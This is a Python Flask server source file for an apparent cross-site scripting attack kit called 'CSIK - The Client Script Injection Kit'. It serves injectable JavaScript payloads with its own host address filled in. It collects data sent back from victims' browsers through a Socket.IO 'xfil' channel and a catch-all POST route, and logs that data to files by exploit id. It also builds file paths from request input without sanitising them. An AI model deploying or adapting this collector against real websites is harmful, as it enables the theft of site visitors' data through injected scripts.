from flask import Flask, request
from flask_cors import CORS
from flask_socketio import SocketIO
import json
import uuid
import os

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app)

log_base = os.getcwd() + '/logs/'


def write_to_file(path, filename, data):
    os.makedirs(log_base + path, exist_ok=True)
    log_file = open(log_base + path + '/' + filename, 'a+')
    log_file.write(data) if isinstance(data, str) else log_file.write(json.dumps(data))
    log_file.write("\n")
    log_file.close()


@app.route('/hello')
def hello_world():
    return 'CSIK - The Client Script Injection Kit'


@app.route('/s/<path:path>')
def get_scripts(path):
    with open('scripts/' + path, 'r') as js_file:
        data = js_file.read()
    csik_server = 'http://' + request.environ.get('HTTP_HOST', 'localhost:5000')
    data = data.replace('$$HOST$$', csik_server)
    return data, 200, {'ContentType': 'text/javascript'}


@app.route('/id')
def get_id():
    return json.dumps({'success': True, 'val': uuid.uuid4().hex}), 200, {'ContentType': 'application/json'}


@socketio.on('xfil', namespace='/x')
def capture_socketio_data(data):
    data = json.loads(data)
    write_to_file(data.get('i', 'not-sup'), data.get('t', 'logfile').replace('/', '_'), data.get('p', 'FAIL'))


@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def capture_data(path):
    request.get_data()
    data = request.data
    exploit_id = request.args.get('i', 'not-sup')
    log_name = path.replace('/', '_') if len(path) > 0 else 'logfile'
    write_to_file(exploit_id, log_name, data.decode('UTF-8'))
    return json.dumps({'success': True}), 200, {'ContentType': 'application/json'}


if __name__ == '__main__':
    socketio.run(app)
